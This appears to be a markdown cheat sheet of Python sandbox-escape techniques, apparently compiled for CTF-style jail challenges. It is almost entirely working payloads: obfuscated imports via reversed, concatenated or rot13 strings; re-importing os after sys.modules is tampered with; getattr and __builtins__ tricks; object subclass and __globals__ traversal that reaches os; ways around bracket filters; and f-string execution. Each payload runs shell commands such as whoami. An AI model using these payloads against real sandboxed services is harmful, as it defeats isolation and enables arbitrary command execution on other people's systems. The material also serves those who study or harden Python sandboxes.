# Breaking out of sandbox

Ref : [https://programmer.help/blogs/python-sandbox-escape.html](https://programmer.help/blogs/python-sandbox-escape.html)

Ref : [https://github.com/se162xg/notes/issues/6](https://github.com/se162xg/notes/issues/6)

#### ways to import

```text
''' put some spaces or tabs in between import and module name '''

import  os
import    os
import        os
```

```text
os = __import__('os')
os.system('ls')
```

```text
import importlib
importlib.import_module('os').system('ls')
```

```text
''' import the library by executing it as a script file '''
''' use print('sys.path') to find the path to libraries '''

2.x
execfile('/usr/lib/python2.7/os.py')
system('ls')

2.x and 3.x
with open('/usr/lib/python3.6/os.py','r') as f:
    exec(f.read())
system('ls')
```

#### transform a string

reverse order, variable concatenation, base64, hex, rot13 and so on

```text
__import__('so'[::-1]).system('ls')
```

```text
b = 'o'
a = 's'
__import__(a+b).system('ls')
```

```text
'''eval / exec to execute a string'''

eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
```

```text
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
```

#### restore `sys.modules`

When `os` is removed from `sys.modules`, it cannot be used anymore.

```text
wrong way:

''' when importing a module, a new object would be created because there is not such a key in the dictionary'''
>>> del sys.modules['os']

correct way:

>>> sys.modules['os'] = 'not allowed'
>>> import os
>>> os.system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
```

bypass it

```text
sys.modules['os'] = 'not allowed' # 

del sys.modules['os']
import os
os.system('ls')
```

#### execute forbidden method

```text
import os
getattr(os, 'metsys'[::-1])('whoami')

os.__getattribute__('system')('ls')
```

#### built-in modules

```text
2.x __builtin__
3.x builtin
2.x and 3.x __builtins__
```

```text
>>> '__import__' in dir(__builtins__)
True
>>> 'eval' in dir(__builtins__)
True
>>> 'execfile' in dir(__builtins__)
True

>>> __builtins__.__dict__['__import__']('os').system('whoami')
```

reload built-in modules

```text
2.x 
reload(__builtins__)

3.x
import imp
imp.reload('__builtins__')
```

#### through inheritance

`mro` \(multiple resolution order\) indicates the multiple inheritance releationship of an object

```text
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
```

```text
>>> import site
>>> site.os
<module 'os' from '/usr/lib/python3.6/os.py'>

or

>>> import site
>>> os
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'os' is not defined
>>> os = reload(site.os)
>>> os.system('whoami')
```

Every class inherits from a built-in class `object`, we can therefore list out its subclasses.

```text
>>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print(i)
...
(70, <type 'dict_values'>)
(71, <class 'site._Printer'>)
...
```

First use `__class__` 、`__mro__`、`__subclasses__`、`__bases__` to get an object, then go to `__globals__` to find some useful modules \ methods \ functions.

```text
>>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
```

#### `[` or `]` is filtered

We can reach to `pop()` or `__getitem__()`

```text
>>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()
```

#### f-string

```text
>>> f'{__import__("os").system("whoami")}'
```

